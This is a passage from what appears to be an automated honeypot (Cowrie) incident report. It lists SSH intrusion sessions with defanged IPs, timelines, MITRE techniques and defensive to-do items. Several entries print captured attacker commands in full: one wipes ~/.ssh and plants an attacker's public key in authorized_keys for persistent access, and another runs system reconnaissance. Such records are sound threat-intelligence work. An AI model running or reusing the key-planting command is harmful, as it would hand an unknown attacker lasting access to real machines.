| `2026-07-26 06:26:47` | `cowrie.session.params` |
| `2026-07-26 06:26:47` | `cowrie.command.input` |
| `2026-07-26 06:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12aad7f304b

| Field | Detail |
|---|---|
| **Source IP** | `2.26.50[.]151` |
| **First Seen** | 2026-07-26 06:31 |
| **Last Seen** | 2026-07-26 06:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:31:07` | `cowrie.session.connect` |
| `2026-07-26 06:31:07` | `cowrie.client.version` |
| `2026-07-26 06:31:07` | `cowrie.client.kex` |
| `2026-07-26 06:31:08` | `cowrie.login.success` |
| `2026-07-26 06:31:09` | `cowrie.session.params` |
| `2026-07-26 06:31:09` | `cowrie.command.input` |
| `2026-07-26 06:31:09` | `cowrie.command.failed` |
| `2026-07-26 06:31:09` | `cowrie.log.closed` |
| `2026-07-26 06:31:09` | `cowrie.session.params` |
| `2026-07-26 06:31:09` | `cowrie.command.input` |
| `2026-07-26 06:31:10` | `cowrie.session.file_download` |
| `2026-07-26 06:31:10` | `cowrie.log.closed` |
| `2026-07-26 06:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.50[.]151` to AbuseIPDB if not already reported
- [ ] Block `2.26.50[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48630fa75b9a

| Field | Detail |
|---|---|
| **Source IP** | `2.26.50[.]151` |
| **First Seen** | 2026-07-26 06:31 |
| **Last Seen** | 2026-07-26 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:31:10` | `cowrie.session.connect` |
| `2026-07-26 06:31:10` | `cowrie.client.version` |
| `2026-07-26 06:31:10` | `cowrie.client.kex` |
| `2026-07-26 06:31:10` | `cowrie.login.success` |
| `2026-07-26 06:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.50[.]151` to AbuseIPDB if not already reported
- [ ] Block `2.26.50[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c893b028fc1f

| Field | Detail |
|---|---|
| **Source IP** | `2.26.50[.]151` |
| **First Seen** | 2026-07-26 06:31 |
| **Last Seen** | 2026-07-26 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:31:10` | `cowrie.session.connect` |
| `2026-07-26 06:31:10` | `cowrie.client.version` |
| `2026-07-26 06:31:10` | `cowrie.client.kex` |
| `2026-07-26 06:31:11` | `cowrie.login.success` |
| `2026-07-26 06:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.50[.]151` to AbuseIPDB if not already reported
- [ ] Block `2.26.50[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff912f462eee

| Field | Detail |
|---|---|
| **Source IP** | `138.118.215[.]192` |
| **First Seen** | 2026-07-26 06:31 |
| **Last Seen** | 2026-07-26 06:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:31:50` | `cowrie.session.connect` |
| `2026-07-26 06:31:51` | `cowrie.client.version` |
| `2026-07-26 06:31:51` | `cowrie.client.kex` |
| `2026-07-26 06:31:53` | `cowrie.login.success` |
| `2026-07-26 06:31:54` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.215[.]192` to AbuseIPDB if not already reported
- [ ] Block `138.118.215[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7faac693de1e

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-07-26 06:31 |
| **Last Seen** | 2026-07-26 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:31:59` | `cowrie.session.connect` |
| `2026-07-26 06:32:00` | `cowrie.client.version` |
| `2026-07-26 06:32:00` | `cowrie.client.kex` |
| `2026-07-26 06:32:02` | `cowrie.login.success` |
| `2026-07-26 06:32:02` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e65bf8357e

| Field | Detail |
|---|---|
| **Source IP** | `58.17.6[.]119` |
| **First Seen** | 2026-07-26 06:35 |
| **Last Seen** | 2026-07-26 06:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:35:08` | `cowrie.session.connect` |
| `2026-07-26 06:35:09` | `cowrie.client.version` |
| `2026-07-26 06:35:09` | `cowrie.client.kex` |
| `2026-07-26 06:35:11` | `cowrie.login.success` |
| `2026-07-26 06:35:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.6[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.17.6[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df0f778eeec

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-07-26 06:35 |
| **Last Seen** | 2026-07-26 06:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:35:22` | `cowrie.session.connect` |
| `2026-07-26 06:35:23` | `cowrie.client.version` |
| `2026-07-26 06:35:23` | `cowrie.client.kex` |
| `2026-07-26 06:35:24` | `cowrie.login.success` |
| `2026-07-26 06:35:24` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359de3529cd5

| Field | Detail |
|---|---|
| **Source IP** | `193.24.211[.]76` |
| **First Seen** | 2026-07-26 06:35 |
| **Last Seen** | 2026-07-26 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:35:29` | `cowrie.session.connect` |
| `2026-07-26 06:35:29` | `cowrie.client.version` |
| `2026-07-26 06:35:29` | `cowrie.client.kex` |
| `2026-07-26 06:35:30` | `cowrie.login.success` |
| `2026-07-26 06:35:30` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:35:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-26 06:35:30` | `cowrie.direct-tcpip.data` |
| `2026-07-26 06:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.24.211[.]76` to AbuseIPDB if not already reported
- [ ] Block `193.24.211[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea085d85670

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:38 |
| **Last Seen** | 2026-07-26 06:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:38:02` | `cowrie.session.connect` |
| `2026-07-26 06:38:02` | `cowrie.client.version` |
| `2026-07-26 06:38:02` | `cowrie.client.kex` |
| `2026-07-26 06:38:05` | `cowrie.login.success` |
| `2026-07-26 06:38:07` | `cowrie.session.params` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.success` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.command.input` |
| `2026-07-26 06:38:07` | `cowrie.log.closed` |
| `2026-07-26 06:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9066e79594

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]158` |
| **First Seen** | 2026-07-26 06:38 |
| **Last Seen** | 2026-07-26 06:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:38:09` | `cowrie.session.connect` |
| `2026-07-26 06:38:09` | `cowrie.client.version` |
| `2026-07-26 06:38:09` | `cowrie.client.kex` |
| `2026-07-26 06:38:10` | `cowrie.login.success` |
| `2026-07-26 06:38:11` | `cowrie.session.params` |
| `2026-07-26 06:38:11` | `cowrie.command.input` |
| `2026-07-26 06:38:11` | `cowrie.command.failed` |
| `2026-07-26 06:38:12` | `cowrie.log.closed` |
| `2026-07-26 06:38:13` | `cowrie.session.params` |
| `2026-07-26 06:38:13` | `cowrie.command.input` |
| `2026-07-26 06:38:13` | `cowrie.session.file_download` |
| `2026-07-26 06:38:13` | `cowrie.log.closed` |
| `2026-07-26 06:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5a5c3510fc

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]158` |
| **First Seen** | 2026-07-26 06:38 |
| **Last Seen** | 2026-07-26 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:38:14` | `cowrie.session.connect` |
| `2026-07-26 06:38:14` | `cowrie.client.version` |
| `2026-07-26 06:38:14` | `cowrie.client.kex` |
| `2026-07-26 06:38:15` | `cowrie.login.success` |
| `2026-07-26 06:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7d3312b12e

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]158` |
| **First Seen** | 2026-07-26 06:38 |
| **Last Seen** | 2026-07-26 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:38:16` | `cowrie.session.connect` |
| `2026-07-26 06:38:16` | `cowrie.client.version` |
| `2026-07-26 06:38:16` | `cowrie.client.kex` |
| `2026-07-26 06:38:17` | `cowrie.login.success` |
| `2026-07-26 06:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]158` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804ecec9f711

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-26 06:39 |
| **Last Seen** | 2026-07-26 06:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:39:41` | `cowrie.session.connect` |
| `2026-07-26 06:39:41` | `cowrie.client.version` |
| `2026-07-26 06:39:41` | `cowrie.client.kex` |
| `2026-07-26 06:39:42` | `cowrie.login.success` |
| `2026-07-26 06:39:43` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3fd76e3eb5

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-26 06:39 |
| **Last Seen** | 2026-07-26 06:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:39:48` | `cowrie.session.connect` |
| `2026-07-26 06:39:48` | `cowrie.client.version` |
| `2026-07-26 06:39:48` | `cowrie.client.kex` |
| `2026-07-26 06:39:50` | `cowrie.login.success` |
| `2026-07-26 06:39:51` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582dbc7bbc3e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:39 |
| **Last Seen** | 2026-07-26 06:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:39:52` | `cowrie.session.connect` |
| `2026-07-26 06:39:52` | `cowrie.client.version` |
| `2026-07-26 06:39:52` | `cowrie.client.kex` |
| `2026-07-26 06:39:55` | `cowrie.login.success` |
| `2026-07-26 06:39:57` | `cowrie.session.params` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.success` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:57` | `cowrie.command.input` |
| `2026-07-26 06:39:58` | `cowrie.log.closed` |
| `2026-07-26 06:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d3392b2994

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-26 06:40 |
| **Last Seen** | 2026-07-26 06:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:40:34` | `cowrie.session.connect` |
| `2026-07-26 06:40:34` | `cowrie.client.version` |
| `2026-07-26 06:40:34` | `cowrie.client.kex` |
| `2026-07-26 06:40:36` | `cowrie.login.success` |
| `2026-07-26 06:40:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf9fae96477

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-26 06:40 |
| **Last Seen** | 2026-07-26 06:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:40:42` | `cowrie.session.connect` |
| `2026-07-26 06:40:42` | `cowrie.client.version` |
| `2026-07-26 06:40:42` | `cowrie.client.kex` |
| `2026-07-26 06:40:43` | `cowrie.login.success` |
| `2026-07-26 06:40:43` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a222f37fec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:41 |
| **Last Seen** | 2026-07-26 06:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:41:48` | `cowrie.session.connect` |
| `2026-07-26 06:41:48` | `cowrie.client.version` |
| `2026-07-26 06:41:48` | `cowrie.client.kex` |
| `2026-07-26 06:41:51` | `cowrie.login.success` |
| `2026-07-26 06:41:53` | `cowrie.session.params` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.success` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:53` | `cowrie.command.input` |
| `2026-07-26 06:41:54` | `cowrie.log.closed` |
| `2026-07-26 06:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfe421a2070

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 06:43 |
| **Last Seen** | 2026-07-26 06:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:43:44` | `cowrie.session.connect` |
| `2026-07-26 06:43:45` | `cowrie.client.version` |
| `2026-07-26 06:43:45` | `cowrie.client.kex` |
| `2026-07-26 06:43:47` | `cowrie.login.success` |
| `2026-07-26 06:43:49` | `cowrie.session.params` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.success` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.command.input` |
| `2026-07-26 06:43:49` | `cowrie.log.closed` |
| `2026-07-26 06:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c8743297e4

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-26 06:44 |
